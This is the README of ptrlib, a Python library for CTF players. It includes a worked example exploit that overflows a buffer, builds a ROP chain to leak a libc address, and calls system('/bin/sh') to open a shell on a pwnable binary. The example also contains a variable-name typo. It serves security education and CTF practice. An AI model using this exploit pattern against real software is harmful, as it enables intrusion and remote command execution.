ptrlib
====

![Python Test (Windows)](https://github.com/ptr-yudai/ptrlib/workflows/Python%20Test%20%28Windows%29/badge.svg)
![Python Test (Ubuntu)](https://github.com/ptr-yudai/ptrlib/workflows/Python%20Test%20%28Ubuntu%29/badge.svg)

Python library which bundles security-related utilities.

## Description
Ptrlib is a Python library for CTF players.
It's designed to make it easy to write a complex program of cryptography, networking, exploit and so on.

## Why not pwntools?
Ptrlib is designed to be as library-independent as possible.
Also, ptrlib has some pros such as supporting Windows process.

## Requirements
Supports: Python 3.10 or later

Library Dependency:
- pycryptodome
- pywin32 (when handling Windows process)

External Program:
- `SSH` requires:
  - ssh
  - expect
- `nasm` requires:
  - nasm
- `assemble` requires:
  - gcc, objcopy (x86, x86-64)
  - arm-linux-gnueabi-gcc, aarch64-linux-gnu-gcc (arm, aarch64)
- `disassemble` requires:
  - objdump (x86, x86-64)
  - arm-linux-gnueabi-objdump, aarch64-linux-gnu-objdump (arm, aarch64)
- `consts` requires:
  - grep
  - gcc (x86, x86-64)

## Usage
Basic examples are available at [/examples](https://github.com/ptr-yudai/ptrlib/tree/master/examples/).

Testcases under [/tests](https://github.com/ptr-yudai/ptrlib/tree/master/tests/) may also help you understand ptrlib.

## Quick Document
There are many functions in ptrlib.
In this section we try using it for a pwnable task.

You can run executable or create socket like this:
```python
sock = Process("./pwn01", cwd="/home/ctf")
sock = Process(["./pwn01", "--debug"], env={"FLAG": "flag{dummy}"})
sock = Process("emacs -nw", shell=True, use_tty=True)
sock = Socket("localhost", 1234)
sock = Socket("example.com", 443, ssl=True, sni="neko")
sock = Socket("0.0.0.0", 8033, udp=True)
sock = SSH("example.com", username="ubuntu", password="p4s$w0rd")
sock = SSH("example.com", username="ubuntu", port=8022, identity="./id_rsa")
```

If you have the target binary or libc, it's recommended to load them first.
```python
elf = ELF("./pwn01")
libc = ELF("./libc.so.6")
```
This doesn't fully analyse the binary so that it runs fast.
Also, ELF class supports cache to reduce calculation.

Since version 2.4.0, ptrlib supports loading debug symbol.
```python
libc = ELF("./libc.so.6")
print(libc.symbol("_IO_stdfile_1_lock"))
```

You can use some useful methods such as `got`, `plt`, `symbol`, `section` and so on.
The following is an example to craft ROP stager.
```python
"""
Connect to host
"""
# Host name supports CTF-style
sock = Socket("nc localhost 1234")
# You can show hexdump for received/sent data for debug
#sock.debug = True

"""
Write ROP chain
"""
addr_stage2 = elf.section(".bss") + 0x400

payload = b'A' * 0x108
payload += p64([
  # puts(puts@got)
  elf.gadget("pop rdi; ret;"),
  elf.got("puts"),
  elf.plt("puts"),
  # gets(stage2)
  # You can use indices to skip useless gadgets (e.g., newlines)
  elf.gadget("pop rdi; ret;")[1],
  addr_stage2,
  elf.plt("gets"),
  # stack pivot
  next(elf.gadget("pop rbp; ret;")), # old notation: `next` also works
  addr_stage2,
  elf.gadget("leave\n ret") # GCC-style
])
sock.sendlineafter("Data: ", payload)

"""
Leak libc address
"""
# You don't need to fill 8 bytes for u64
leak = u64(sock.recvline())
# This will show warning if base address looks incorrect
libc.base = leak - libc.symbol("puts")

payload  = b'A' * 8
paylaod += p64(next(elf.gadget("ret")))
# Automatically rebase after <ELF>.base is set
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbol("system"))

# Shows warning if payload contains a character `gets` cannot accept
is_gets_safe(payload) # is_[cin/fgets/gets/getline/scanf/stream]_safe

sock.sendline(payload)

sock.sh() # or sock.interactive()
```

Interaction with curses is supported since 2.1.0.
```
sock.recvscreen()
if sock.recvscreen(returns=list)[1][1] == '#':
  sock.sendctrl("up")
else:
  sock.sendctrl("esc")
```

## Install
Run `pip install --upgrade ptrlib` or `python setup.py install`.

## Licence

[MIT](https://github.com/tcnksm/tool/blob/master/LICENCE)

## Author

[ptr-yudai](https://github.com/ptr-yudai)

## Contributor
Feel free to make a pull request / issue :)

- [jptomoya](https://github.com/jptomoya)
  - Added CI for Windows
  - Added SSL support
  - Refactored test cases
- [theoremoon](https://github.com/theoremoon)
  - Added/fixed several cryptography functions
  - Added buffering of Socket/Process
  - Added status check (CI test)
- [keymoon](https://github.com/key-moon)
  - Added algorithm package
  - Added debug-symbol parser
